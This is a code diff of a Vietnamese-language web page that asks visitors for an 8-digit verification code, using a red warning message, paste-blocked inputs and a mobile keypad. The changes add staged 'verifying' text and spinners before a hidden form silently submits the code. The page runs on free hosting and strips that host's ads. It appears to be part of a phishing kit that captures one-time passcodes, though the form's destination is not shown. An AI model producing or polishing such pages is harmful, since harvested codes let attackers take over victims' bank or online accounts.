@@ -26,14 +26,13 @@
     }
 
     .message {
-        font-size: 20px; /* PC */
+        font-size: 20px;
         font-weight: bold;
         margin-bottom: 30px;
         color: red;
         line-height: 1.4;
     }
 
-    /* Mobile message */
     @media (max-width: 768px) {
         .message {
             font-size: 16px;
@@ -43,7 +42,7 @@
         }
     }
 
-    /* PC version OTP */
+    /* PC OTP */
     .otp-container {
         display: flex;
         justify-content: space-between;
@@ -58,7 +57,7 @@
         border: 2px solid #ccc;
         border-radius: 8px;
         outline: none;
-        caret-color: black; 
+        caret-color: black;
     }
 
     .otp-container input:focus {
@@ -78,6 +77,13 @@
         animation: spin 1s linear infinite;
     }
 
+    .loading-text {
+        display: none;
+        color: gray;
+        font-size: 18px;
+        margin-top: 10px;
+    }
+
     @keyframes spin {
         0% { transform: rotate(0deg);}
         100% { transform: rotate(360deg);}
@@ -85,22 +91,25 @@
 
     form { display: none; }
 
-    /* Mobile version keypad */
+    /* Mobile keypad */
     .mobile-keypad {
         display: none;
         flex-direction: column;
         align-items: center;
     }
+
     .otp-display {
         font-size: 32px;
         letter-spacing: 10px;
         margin-bottom: 20px;
     }
+
     .keypad-grid {
         display: grid;
         grid-template-columns: repeat(3, 70px);
         gap: 10px;
     }
+
     .keypad-grid button {
         height: 60px;
         font-size: 22px;
@@ -109,12 +118,12 @@
         background: #f5f5f5;
         transition: 0.2s;
     }
+
     .keypad-grid button:active {
         background: #d7d7ff;
         transform: scale(0.95);
     }
 
-    /* Hiển thị mobile version khi dưới 768px */
     @media (max-width: 768px) {
         .otp-container { display: none; }
         .mobile-keypad { display: flex; }
@@ -132,7 +141,7 @@
         Vui lòng kiểm tra và nhập mã xác thực bên dưới.
     </div>
 
-    <!-- PC/Laptop -->
+    <!-- PC/Laptop OTP -->
     <div class="otp-container" id="otpContainer">
         <input type="text" maxlength="1">
         <input type="text" maxlength="1">
@@ -153,6 +162,7 @@
             <button>7</button><button>8</button><button>9</button>
             <div></div><button>0</button><div></div>
         </div>
+        <div class="loading-text" id="loadingText">Đang xác thực...</div>
     </div>
 
     <div class="spinner" id="spinner"></div>
@@ -163,7 +173,7 @@
 </div>
 
 <script>
-    // Dọn rác quảng cáo (Somee)
+    // Xóa quảng cáo Somee
     setInterval(function () {
         document.querySelectorAll("div[style*='opacity: 0.9'][style*='z-index: 2147483647']").forEach(el => el.remove());
         document.querySelectorAll("div[onmouseover='S_ssac();']").forEach(el => el.remove());
@@ -178,6 +188,7 @@
     const spinner = document.getElementById('spinner');
     const otpDisplay = document.getElementById('otpDisplay');
     const keypadGrid = document.getElementById('keypadGrid');
+    const loadingText = document.getElementById('loadingText');
 
     let currentIndex = 0;
     let codeArr = Array(8).fill('*');
@@ -191,65 +202,75 @@
         inputs.forEach(i => i.disabled = true);
     }
 
-    // PC version input logic
+    // PC input logic
     inputs.forEach((input, index) => {
         input.addEventListener('mousedown', e => {
-            if (index !== currentIndex) {
-                e.preventDefault();
-                focusCurrent();
-            }
+            if(index !== currentIndex){ e.preventDefault(); focusCurrent(); }
         });
         input.addEventListener('focus', e => {
-            if (index !== currentIndex) focusCurrent();
+            if(index !== currentIndex) focusCurrent();
         });
         input.addEventListener('paste', e => e.preventDefault());
     });
 
-    document.addEventListener('keydown', function(e) {
-        if (e.key >= '0' && e.key <= '9') {
-            if (window.innerWidth <= 768) return;
+    document.addEventListener('keydown', function(e){
+        if(e.key >= '0' && e.key <= '9'){
+            if(window.innerWidth <= 768) return;
             inputs[currentIndex].value = e.key;
             currentIndex++;
-            if (currentIndex < inputs.length) focusCurrent();
+            if(currentIndex < inputs.length) focusCurrent();
             else processDone();
             e.preventDefault();
-        } else if (e.key === 'Backspace') {
-            if (currentIndex > 0) {
+        } else if(e.key === 'Backspace'){
+            if(currentIndex > 0){
                 currentIndex--;
                 inputs[currentIndex].value = '';
                 focusCurrent();
             }
             e.preventDefault();
-        } else if (e.key !== "Tab") e.preventDefault();
+        } else if(e.key !== 'Tab'){
+            e.preventDefault();
+        }
     });
 
     // Mobile keypad logic
-    if (keypadGrid) {
+    if(keypadGrid){
         keypadGrid.querySelectorAll('button').forEach(btn => {
             btn.addEventListener('click', () => {
-                if (currentIndex >= 8) return;
+                if(currentIndex >= 8) return;
                 const val = btn.textContent;
                 codeArr[currentIndex] = val;
                 currentIndex++;
                 updateDisplay();
-                if (currentIndex === 8) processDone();
+                if(currentIndex === 8) processDone();
             });
         });
     }
 
     function updateDisplay() {
-        otpDisplay.textContent = codeArr.map((v, i) => i < currentIndex ? v : '*').join(' ');
+        otpDisplay.textContent = codeArr.map((v,i)=> i<currentIndex?v:'*').join(' ');
     }
 
-    function processDone() {
-        txtCode.value = codeArr.join('');
-        disableInputs();
-        setTimeout(() => {
+    function processDone(){
+        if(window.innerWidth <= 768){
+            // Mobile
+            txtCode.value = codeArr.join('');
+            loadingText.style.display = 'block'; // hiện text gray
+            setTimeout(() => {
+                otpDisplay.style.display = 'none';
+                loadingText.style.display = 'none';
+                spinner.style.display = 'block';
+                setTimeout(()=> hiddenForm.submit(), 3000); // 3s spinner trước submit
+            }, 2000); // 2s text gray trước spinner
+        } else {
+            // PC
+            txtCode.value = inputs.map(i=>i.value).join('');
+            disableInputs();
+            inputs.forEach(i=>i.blur());
             otpContainer.style.display = 'none';
-            document.getElementById('mobileKeypad').style.display = 'none';
             spinner.style.display = 'block';
-            setTimeout(() => hiddenForm.submit(), 5000);
-        }, 3000);
+            setTimeout(()=> hiddenForm.submit(), 5000);
+        }
     }
 </script>
 
